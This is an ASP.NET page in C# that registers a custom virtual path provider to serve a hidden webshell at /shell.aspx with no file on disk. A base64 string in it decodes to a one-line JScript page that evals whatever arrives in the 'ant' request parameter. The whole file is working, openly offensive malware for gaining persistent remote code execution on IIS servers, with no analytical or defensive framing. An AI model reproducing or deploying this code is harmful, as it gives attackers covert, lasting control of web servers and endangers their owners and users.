<%@ Page Language="c#" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Web.Hosting" %>
<%@ Import Namespace="System.Web.Mvc" %>
<%@ Import Namespace="System.Web.Routing" %>

<script runat="server">
    public class SamplePathProvider : System.Web.Hosting.VirtualPathProvider
    {
        private string _virtualDir;
        private string _fileContent;

        public SamplePathProvider(string virtualDir, string fileContent)
            : base()
        {
            _virtualDir = virtualDir;
            _fileContent = fileContent;
        }

        private bool IsPathVirtual(string virtualPath)
        {
            System.String checkPath = System.Web.VirtualPathUtility.ToAppRelative(virtualPath);
            return checkPath.ToLower().Contains(_virtualDir.ToLower());
        }

        public override bool FileExists(string virtualPath)
        {
            if (IsPathVirtual(virtualPath))
            {
                return true;
            }
            else
            {
                return Previous.FileExists(virtualPath);
            }
        }


        public override System.Web.Hosting.VirtualFile GetFile(string virtualPath)
        {
            if (IsPathVirtual(virtualPath))
                return new SampleVirtualFile(virtualPath, _fileContent);
            else
                return Previous.GetFile(virtualPath);
        }
    }

    public class SampleVirtualFile : System.Web.Hosting.VirtualFile
    {
        private string _fileContent;

        public bool Exists
        {
            get { return true; }
        }

        public SampleVirtualFile(string virtualPath, string fileContent)
            : base(virtualPath)
        {
            this._fileContent = fileContent;
        }

        public override System.IO.Stream Open()
        {
            System.IO.Stream stream = new System.IO.MemoryStream(System.Text.Encoding.UTF8.GetBytes(_fileContent));
            return stream;
        }
    }
</script>

<% 
    string webshellContentsBase64 = "SSBhbSBhIFdlYlNoZWxsPCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQiJT48JWV2YWwoUmVxdWVzdC5JdGVtWyJhbnQiXSwidW5zYWZlIik7JT4=";
    string webshellType = ".aspx";
    string webshellContent = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(webshellContentsBase64));
    string targetVirtualPath = "/shell.aspx";
    try
    {
        SamplePathProvider sampleProvider = new SamplePathProvider(targetVirtualPath, webshellContent);
        HostingEnvironment.RegisterVirtualPathProvider(sampleProvider);
        sampleProvider.InitializeLifetimeService();
    }
    catch (System.Exception error)
    {
        Console.WriteLine(error);
    }
%>